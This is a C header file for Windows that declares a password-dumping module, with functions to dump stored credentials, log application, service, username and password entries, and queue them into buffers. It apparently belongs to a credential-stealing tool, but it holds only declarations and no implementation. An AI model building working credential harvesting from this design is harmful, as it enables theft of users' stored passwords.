#ifndef _PASSWORD_H
#define _PASSWORD_H
#pragma pack(1)
#include <Windows.h>
#include <WinCred.h>

#define MAX_PASSWORD_QUEUE 10000
#define MAX_URL_HISTORY 1024

typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} PASSWORD_LOGS, *LPPASSWORD_LOGS;

extern PASSWORD_LOGS lpPasswordLogs;

typedef struct _CONTAINER
{
	LPBYTE *lpBuffer;
	LPDWORD dwBuffSize;

} CONTAINER, *LPCONTAINER;

VOID PasswordMain();
VOID DumpPassword();
VOID GetHashStr(LPWSTR strPassword, LPSTR strHash);
BOOL PasswordLogEntry(LPWSTR strAppName, LPWSTR strService, LPWSTR strUserName, LPWSTR strPassword, LPBYTE *lpBuffer, LPDWORD dwBuffSize);
BOOL QueuePasswordLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize);
#endif